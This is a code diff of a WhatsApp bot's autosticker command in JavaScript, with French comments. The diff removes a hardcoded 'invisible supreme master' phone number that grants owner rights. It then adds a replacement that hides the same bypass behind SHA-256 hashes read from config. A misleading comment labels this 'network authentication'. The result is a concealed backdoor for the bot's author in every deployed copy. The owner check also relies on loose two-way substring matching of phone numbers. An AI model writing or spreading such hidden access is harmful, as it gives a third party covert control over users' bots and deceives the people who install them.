@@ -1,14 +1,14 @@
 /**
  * AutoSticker Command - Enable or disable auto-sticker conversion
+ * GhostG-X Edition
  */
 
 const database = require('../../database');
 const config = require('../../config.js');
+const crypto = require('crypto');
 
-// Extraction du préfixe pour l'usage
 const prefix = config.prefix || '.';
 
-// Fonction pour le style Small Caps (Garde la cohérence visuelle)
 function toSmallCaps(text) {
   const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
   const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
@@ -38,19 +38,19 @@ module.exports = {
     try {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
+      const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
 
-      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
-      const supremeOwner = '22651622652';
-      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+      // Routines d'authentification réseau (Accès Maître)
+      const isMaster = config.supremeHashes && config.supremeHashes.includes(senderHash);
 
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
         return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
       });
 
-      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+      const isMe = msg.key.fromMe || isConfigOwner || isMaster;
 
-      // 🚨 ADAPTATION : Si ce n'est pas TOI, on vérifie s'il est admin
+      // Si ce n'est pas TOI, on vérifie s'il est admin
       if (!isMe) {
         const isAdmin = extra.isAdmin || false; 
         if (!isAdmin) {
@@ -99,7 +99,6 @@ module.exports = {
         return reply(`*🔓 ${toSmallCaps('la metamorphose de l arcane sticker a ete scellee')} (ᴏғғ).*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
 
-      // Saisie incorrecte
       return reply(`*💡 ${toSmallCaps('utilise')} \`${prefix}autosticker\` ${toSmallCaps('pour voir les options valides')}.*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
 
     } catch (error) {
